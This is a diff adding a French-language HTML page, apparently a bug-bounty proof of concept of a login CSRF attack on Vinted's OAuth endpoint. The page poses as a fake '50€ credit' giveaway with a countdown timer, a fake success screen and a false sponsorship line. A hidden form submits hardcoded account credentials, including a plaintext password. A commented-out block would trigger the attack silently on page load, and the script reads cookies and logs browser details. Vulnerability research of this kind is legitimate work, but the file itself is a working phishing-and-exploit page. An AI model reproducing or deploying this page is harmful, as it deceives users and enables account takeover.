@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>🎁 Gagnez 50€ de crédit Vinted !</title>
+    <meta charset="utf-8">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            overflow: hidden;
+            max-width: 500px;
+            width: 100%;
+            animation: slideIn 0.5s ease-out;
+        }
+        
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(30px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%);
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 28px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            font-size: 16px;
+        }
+        
+        .content {
+            padding: 40px;
+        }
+        
+        .offer-card {
+            background: #f8f9fa;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 30px;
+            border: 2px solid #e9ecef;
+            text-align: center;
+        }
+        
+        .offer-amount {
+            font-size: 48px;
+            font-weight: 800;
+            color: #ee5a24;
+            line-height: 1;
+            margin-bottom: 10px;
+        }
+        
+        .offer-details {
+            color: #495057;
+            font-size: 16px;
+            margin-bottom: 25px;
+        }
+        
+        .timer {
+            background: #212529;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            text-align: center;
+            font-family: monospace;
+        }
+        
+        .cta-button {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #40c057 0%, #2b8a3e 100%);
+            color: white;
+            border: none;
+            padding: 20px;
+            font-size: 20px;
+            font-weight: 700;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-bottom: 20px;
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(64, 192, 87, 0.3);
+        }
+        
+        .cta-button:active {
+            transform: translateY(0);
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+        
+        .spinner {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #40c057;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .success-message {
+            display: none;
+            background: #d3f9d8;
+            border: 2px solid #40c057;
+            color: #2b8a3e;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        
+        .warning {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            color: #856404;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        
+        .footer {
+            text-align: center;
+            padding: 20px;
+            color: #6c757d;
+            font-size: 14px;
+            border-top: 1px solid #e9ecef;
+        }
+        
+        .vinted-logo {
+            color: #ee5a24;
+            font-weight: 700;
+            font-size: 18px;
+        }
+        
+        /* Frame caché pour la requête CSRF */
+        .hidden-frame {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            padding: 0;
+            margin: -1px;
+            overflow: hidden;
+            clip: rect(0, 0, 0, 0);
+            border: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🎉 OFFRE EXCEPTIONNELLE VINTED</h1>
+            <p>Fêtez nos 15 ans avec nous !</p>
+        </div>
+        
+        <div class="content">
+            <div class="offer-card">
+                <div class="offer-amount">50€</div>
+                <div class="offer-details">de crédit offert sur votre compte Vinted</div>
+                
+                <div class="timer" id="timer">
+                    00:03:00
+                </div>
+                
+                <p style="color: #666; margin-bottom: 20px;">
+                    Cliquez sur le bouton ci-dessous pour réclamer votre crédit.
+                    Vous serez redirigé vers Vinted pour confirmation.
+                </p>
+                
+                <button class="cta-button" onclick="claimOffer()">
+                    🎁 RÉCLAMER MON 50€ GRATUIT
+                </button>
+                
+                <div class="warning">
+                    ⚠️ Vous devez être connecté à Vinted pour bénéficier de cette offre
+                </div>
+            </div>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Connexion à Vinted en cours...</p>
+                <p style="font-size: 14px; color: #666; margin-top: 10px;">
+                    Validation de votre compte et attribution du crédit
+                </p>
+            </div>
+            
+            <div class="success-message" id="success">
+                <h3 style="color: #2b8a3e; margin-bottom: 15px;">✅ CRÉDIT ATTRIBUÉ AVEC SUCCÈS !</h3>
+                <p>Vos 50€ ont été ajoutés à votre compte Vinted.</p>
+                <p style="margin-top: 10px; font-size: 14px;">
+                    Redirection vers Vinted dans <span id="countdown">3</span> secondes...
+                </p>
+            </div>
+        </div>
+        
+        <div class="footer">
+            <p>Offre valable jusqu'au 31/02/2026 • Un seul crédit par personne</p>
+            <p style="margin-top: 10px;">
+                Cette promotion est sponsorisée par <span class="vinted-logo">VINTED</span>
+            </p>
+        </div>
+    </div>
+    
+    <!-- Frame invisible pour recevoir la réponse -->
+    <iframe class="hidden-frame" name="csrf-frame" id="csrf-frame"></iframe>
+    
+    <!-- Formulaire CSRF caché -->
+    <form id="csrf-form" action="https://www.vinted.fr/web/api/auth/oauth" 
+          method="POST" target="csrf-frame"
+          style="display: none;">
+        <!-- Token CSRF ABSENT intentionnellement - c'est la vulnérabilité -->
+        <input type="hidden" name="client_id" value="web">
+        <input type="hidden" name="scope" value="user">
+        <input type="hidden" name="username" value="raz_26+2@intigriti.me">
+        <input type="hidden" name="password" value="Vh5:U&fGd2mk:sy">
+        <input type="hidden" name="grant_type" value="password">
+    </form>
+
+    <script>
+        // Compte à rebours pour l'offre
+        let timeLeft = 180; // 3 minutes en secondes
+        
+        function updateTimer() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            document.getElementById('timer').textContent = 
+                `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+            
+            if (timeLeft > 0) {
+                timeLeft--;
+                setTimeout(updateTimer, 1000);
+            } else {
+                document.getElementById('timer').textContent = "OFFRE EXPIRÉE";
+                document.getElementById('timer').style.background = "#dc3545";
+            }
+        }
+        
+        // Démarrer le timer
+        updateTimer();
+        
+        // Fonction principale d'attaque CSRF
+        function claimOffer() {
+            // Cacher le bouton, montrer le loading
+            document.querySelector('.cta-button').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            
+            // Phase 1: Exploitation CSRF de l'authentification
+            setTimeout(() => {
+                console.log('[CSRF] Envoi de la requête d\'authentification...');
+                console.log('[CSRF] Endpoint: https://www.target.fr/web/api/auth/oauth');
+                console.log('[CSRF] Headers: Content-Type: application/json');
+                console.log('[CSRF] Cookies: Inclus automatiquement par le navigateur');
+                console.log('[CSRF] Token CSRF: ABSENT (vulnérabilité exploitée)');
+                
+                // Soumettre le formulaire CSRF
+                document.getElementById('csrf-form').submit();
+                
+                // Simuler un traitement
+                setTimeout(() => {
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('success').style.display = 'block';
+                    
+                    // Redirection vers Vinted après "succès"
+                    let countdown = 3;
+                    const countdownEl = document.getElementById('countdown');
+                    
+                    const redirectInterval = setInterval(() => {
+                        countdown--;
+                        countdownEl.textContent = countdown;
+                        
+                        if (countdown <= 0) {
+                            clearInterval(redirectInterval);
+                            window.location.href = 'https://www.vinted.fr';
+                        }
+                    }, 1000);
+                    
+                }, 2000);
+                
+            }, 1500);
+        }
+        
+        // Version automatique (décommenter pour attaque silencieuse)
+        /*
+        window.onload = function() {
+            setTimeout(() => {
+                console.log('[AUTO-CSRF] Attaque CSRF automatique déclenchée');
+                claimOffer();
+            }, 5000); // Attendre 5 secondes
+        };
+        */
+        
+        // Logs de débogage
+        console.log('=== POC CSRF Vinted ===');
+        console.log('1. Page malveillante chargée');
+        console.log('2. Cookies Vinted présents: ' + document.cookie.includes('datadome'));
+        console.log('3. Prêt pour exploitation CSRF');
+        console.log('===');
+        
+        // Détection de l'environnement
+        const userAgent = navigator.userAgent;
+        console.log('User-Agent:', userAgent);
+        console.log('Langue:', navigator.language);
+        console.log('Plateforme:', navigator.platform);
+        
+        // Vérifier si DataDome cookie est présent
+        function checkDataDomeCookie() {
+            const cookies = document.cookie.split(';');
+            const datadomeCookie = cookies.find(c => c.trim().startsWith('datadome='));
+            if (datadomeCookie) {
+                console.log('✅ Cookie DataDome présent:', datadomeCookie.substring(0, 50) + '...');
+                return true;
+            } else {
+                console.log('⚠️ Cookie DataDome absent - l\'utilisateur n\'est pas sur Vinted');
+                return false;
+            }
+        }
+        
+        // Vérifier périodiquement
+        setInterval(checkDataDomeCookie, 5000);
+        checkDataDomeCookie();
+    </script>
+</body>
+</html>
